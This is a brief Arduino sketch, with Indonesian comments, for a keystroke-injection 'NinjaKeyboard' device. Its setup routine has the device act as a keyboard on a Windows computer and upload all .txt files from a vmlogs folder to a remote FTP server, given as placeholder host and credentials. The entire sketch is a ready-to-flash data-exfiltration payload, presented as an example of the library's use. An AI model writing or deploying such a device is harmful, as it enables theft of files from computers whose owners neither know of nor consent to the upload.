#include <NinjaKeyboard.h>

EthicNinjaKeyboard en;

void setup()
{
  //Inisialisasi program
  en.init(1500);
  //Untuk upload multi file (contoh semua file txt pada folder vmlogs akan diupload ke server ftp
  en.winFTP("mput","user_ftp","pass_ftp","host_ftp", "port_ftp","./vmlogs/*.txt");
}

void loop() {
  
}

